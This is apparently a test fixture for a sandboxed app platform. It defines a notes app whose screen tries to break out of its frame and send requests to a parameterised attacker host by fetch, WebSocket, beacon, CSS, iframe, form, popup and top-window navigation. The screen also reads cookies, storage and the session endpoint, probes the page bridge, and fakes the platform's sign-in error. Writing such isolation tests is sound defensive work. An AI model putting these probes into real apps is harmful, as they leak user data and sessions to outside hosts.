/**
 * The App the screen tests run: notes that update live for everyone, a
 * button that fails, an answer that looks like the platform's error, and
 * a screen that tries every way out of its frame it can think of, each
 * aimed at `attacker`.
 */

const serverCode = `import { DurableObject } from "cloudflare:workers";

type Caller = { userId: string };
type Watcher = ((notes: string[]) => Promise<void>) & Disposable & { dup(): Watcher };

export class App extends DurableObject {
  #watchers = new Set<Watcher>();

  notes(): string[] {
    this.ctx.storage.sql.exec("CREATE TABLE IF NOT EXISTS notes (note TEXT)");
    return this.ctx.storage.sql
      .exec("SELECT note FROM notes")
      .toArray()
      .map((row) => String(row.note));
  }

  addNote(caller: Caller, note: string): void {
    this.notes();
    this.ctx.storage.sql.exec("INSERT INTO notes VALUES (?)", \`\${note} by \${caller.userId}\`);
    const notes = this.notes();
    for (const watcher of this.#watchers) {
      void this.#send(watcher, notes);
    }
  }

  watchNotes(_caller: Caller, onChange: Watcher): void {
    const watcher = onChange.dup();
    this.#watchers.add(watcher);
    void this.#send(watcher, this.notes());
  }

  async #send(watcher: Watcher, notes: string[]): Promise<void> {
    try {
      await watcher(notes);
    } catch {
      this.#watchers.delete(watcher);
      watcher[Symbol.dispose]();
    }
  }

  lookLikeThePlatform(): Error {
    return Object.assign(new Error("Sign in to continue."), { code: "auth.unauthenticated" });
  }
}
`;

const screenCode = (
  attacker: string
) => `import { callServer, useLive } from "@grasp-os/sdk/screen";
import { Button } from "@grasp-os/ui/components/button";
import { useEffect, useState } from "react";

const attacker = "${attacker}";
// Tailwind builds this class from the source text, wherever it is.
const tailwindProbe = "bg-[url(${attacker}/tailwind)]";

/** Reaches the page's bridge directly, past the SDK, as any inline script can. */
const bridgeProbe = \`import { bridge } from "@grasp-os~sdk~screen-runtime.js";
const page = bridge();
const tried = async (run) => {
  try {
    await run();
    return "allowed";
  } catch (error) {
    return error?.code ?? "refused";
  }
};
const results = {
  nameObject: await tried(() => page.call({ toString: () => "notes" }, [])),
  session: await tried(() => page.authenticate()),
  apps: await tried(() => page.apps.list()),
  screens: await tried(() => page.screens.call("another-app", "notes", [])),
  prototype: await tried(() => page.constructor("return 1")),
};
document.body.dataset.bridge = JSON.stringify(results);\`;

const settled = async (attempt: () => unknown): Promise<string> => {
  try {
    const result = await attempt();
    return result === null || result === false ? "blocked" : "allowed";
  } catch {
    return "blocked";
  }
};

const socketOutcome = async (): Promise<string> =>
  await new Promise((resolve) => {
    try {
      const socket = new WebSocket(\`\${attacker.replace("http", "ws")}/socket\`);
      socket.addEventListener("open", () => resolve("allowed"));
      socket.addEventListener("error", () => resolve("blocked"));
    } catch {
      resolve("blocked");
    }
  });

const imageOutcome = async (): Promise<string> =>
  await new Promise((resolve) => {
    const image = new Image();
    image.addEventListener("load", () => resolve("allowed"));
    image.addEventListener("error", () => resolve("blocked"));
    image.src = \`\${attacker}/image\`;
  });

const probe = async (): Promise<Record<string, string>> => {
  const style = document.createElement("style");
  style.textContent = \`@import url(\${attacker}/import); @font-face { font-family: probe; src: url(\${attacker}/font); } html { background-image: url(\${attacker}/style); font-family: probe; }\`;
  document.head.append(style);
  const styled = document.createElement("div");
  styled.classList.add(tailwindProbe);
  document.body.append(styled);
  const frame = document.createElement("iframe");
  frame.src = \`\${attacker}/frame\`;
  document.body.append(frame);
  const form = document.createElement("form");
  form.action = \`\${attacker}/form\`;
  form.method = "post";
  document.body.append(form);
  const script = document.createElement("script");
  script.type = "module";
  script.textContent = bridgeProbe;
  document.head.append(script);
  // Neither says whether it got out: the attacker's server does.
  navigator.sendBeacon(\`\${attacker}/beacon\`, "data");
  form.submit();
  return {
    fetch: await settled(async () => await fetch(\`\${attacker}/fetch\`)),
    fetchCore: await settled(async () => await fetch("/api/auth/get-session")),
    socket: await socketOutcome(),
    image: await imageOutcome(),
    popup: await settled(() => window.open(\`\${attacker}/popup\`)),
    top: await settled(() => {
      if (window.top) {
        window.top.location.href = \`\${attacker}/top\`;
      }
    }),
    parentDocument: await settled(() => window.parent.document.cookie),
    cookie: await settled(() => document.cookie),
    storage: await settled(() => localStorage.length),
    // The rules are there; only the policy keeps their images out.
    tailwindRule: getComputedStyle(styled).backgroundImage.includes("/tailwind") ? "applied" : "missing",
    styleRule: getComputedStyle(document.documentElement).backgroundImage.includes("/style") ? "applied" : "missing",
  };
};

export default function Notes() {
  const notes = useLive<string[]>("watchNotes", []);
  const [answer, setAnswer] = useState("");
  const [probes, setProbes] = useState("");
  useEffect(() => {
    void probe().then((results) => {
      setProbes(JSON.stringify(results));
    });
  }, []);
  return (
    <main className="flex flex-col gap-4 p-4">
      <h1 className="text-lg font-medium">Notes</h1>
      <ul aria-label="Notes">
        {notes.map((note) => (
          <li key={note}>{note}</li>
        ))}
      </ul>
      <div className="flex gap-2">
        <Button onClick={() => void callServer("addNote", "Call Acme")}>Add a note</Button>
        <Button
          onClick={() => {
            throw new Error("Invoice 7 has no total");
          }}
          variant="outline"
        >
          Fail
        </Button>
        <Button
          onClick={() =>
            void callServer("lookLikeThePlatform").then((value) => {
              setAnswer(value instanceof Error ? "an answer" : "something else");
            })
          }
          variant="outline"
        >
          Ask
        </Button>
      </div>
      <output aria-label="Answer">{answer}</output>
      <output aria-label="Probes">{probes}</output>
    </main>
  );
}
`;

/** The App's files, with every attempt aimed at `attacker`. */
export const screenAppFiles = (attacker: string): Record<string, string> => ({
  "app/server.ts": serverCode,
  "screens/notes.tsx": screenCode(attacker),
});
